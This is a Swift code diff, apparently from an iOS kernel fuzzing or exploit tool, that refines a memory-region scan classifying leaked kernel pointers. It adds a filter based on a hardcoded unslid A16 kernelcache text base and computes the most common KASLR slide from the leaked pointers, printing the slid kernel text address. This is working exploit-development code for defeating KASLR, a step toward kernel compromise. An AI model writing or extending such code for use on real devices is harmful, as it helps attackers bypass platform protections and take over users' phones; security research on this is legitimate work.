@@ -1878,8 +1878,14 @@ func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
                     let b0v = UInt8(val & 0xFF)
                     let isFillPattern = (val == UInt64(b0v) &* 0x0101010101010101)
 
+                    // Slide validity: realistic KASLR window on A16 is 0–1GB (0x40000000)
+                    // Values with negative or oversized slide are kernel data constants, not code ptrs
+                    let unslid: UInt64 = 0xFFFFFFF007004000
+                    let computedSlide = val &- unslid
+                    let slideValid = computedSlide <= 0x40000000
+
                     let cat: String
-                    if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && lowBitsAligned && !isFillPattern {
+                    if val >= 0xFFFFFFF000000000 && val < 0xFFFFFFF080000000 && lowBitsAligned && !isFillPattern && slideValid {
                         cat = "KTEXT"; rKTEXT += 1; cKTEXT += 1
                         if ktextSamples.count < 30 {
                             ktextSamples.append((region: UInt(addr), offset: qw*8, val: val))
@@ -1927,13 +1933,22 @@ func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
             }
         }
 
-        // KASLR: unslid __TEXT base from kernelcache.release.iphone15b = 0xFFFFFFF007004000
+        // KASLR: all samples here passed slideValid, so slide is guaranteed 0–0x40000000
         if !ktextSamples.isEmpty {
-            step("KASLR CANDIDATES (\(ktextSamples.count) KTEXT ptrs found):")
-            let unslid: UInt64 = 0xFFFFFFF007004000
+            step("KASLR CANDIDATES (\(ktextSamples.count) valid KTEXT ptrs):")
+            let unslidBase: UInt64 = 0xFFFFFFF007004000
+            // Find dominant slide (most common value = likely the real KASLR slide)
+            var slideCounts: [UInt64: Int] = [:]
+            for s in ktextSamples {
+                slideCounts[s.val &- unslidBase, default: 0] += 1
+            }
+            if let dominant = slideCounts.max(by: { $0.value < $1.value }) {
+                step("  DOMINANT slide = 0x\(String(dominant.key,radix:16)) (×\(dominant.value) ptrs agree)")
+                step("  → slid __TEXT = 0x\(String(unslidBase &+ dominant.key,radix:16))")
+            }
             for s in ktextSamples.prefix(10) {
-                let slide = s.val &- unslid
-                step("  0x\(String(s.val,radix:16)) @ +0x\(String(s.offset,radix:16)) → slide~0x\(String(slide,radix:16))")
+                let slide = s.val &- unslidBase
+                step("  0x\(String(s.val,radix:16)) @ +0x\(String(s.offset,radix:16)) slide=0x\(String(slide,radix:16))")
             }
         } else {
             step("NO KTEXT ptrs found — all leaks are KHEAP/KMMIO")
